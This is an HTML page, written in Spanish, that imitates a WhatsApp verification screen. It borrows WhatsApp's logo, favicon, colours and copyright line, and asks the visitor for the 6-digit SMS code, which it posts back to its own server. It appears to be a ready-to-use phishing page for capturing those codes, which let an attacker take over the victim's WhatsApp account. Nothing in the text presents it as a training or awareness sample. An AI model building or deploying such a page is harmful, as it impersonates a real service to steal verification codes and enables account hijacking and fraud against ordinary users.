<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Verificación de WhatsApp</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://web.whatsapp.com/favicon.ico">
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: "Segoe UI", sans-serif;
            background-color: #e5ddd5;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
        }

        .card {
            background-color: #ffffff;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        img {
            width: 60px;
            margin-bottom: 1rem;
        }

        h2 {
            color: #075e54;
            margin-bottom: 10px;
        }

        p {
            color: #333;
            font-size: 15px;
            margin-bottom: 20px;
        }

        input[type="text"] {
            width: 100%;
            padding: 14px;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 16px;
            margin-bottom: 15px;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #25D366;
            border: none;
            color: white;
            font-size: 16px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #1ebe5d;
        }

        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #888;
        }

        @media (max-width: 480px) {
            .card {
                padding: 1.5rem;
            }

            input[type="text"],
            button {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="Logo WhatsApp">
        <h2>Verificación de WhatsApp</h2>
        <p>Introduce el código de 6 dígitos que recibiste por SMS para continuar.</p>
        <form method="POST">
            <input type="text" name="codigo" placeholder="Código de verificación" maxlength="6" required>
            <button type="submit">Verificar</button>
        </form>
    </div>
    <div class="footer">© WhatsApp Inc. 2025</div>
</body>
</html>
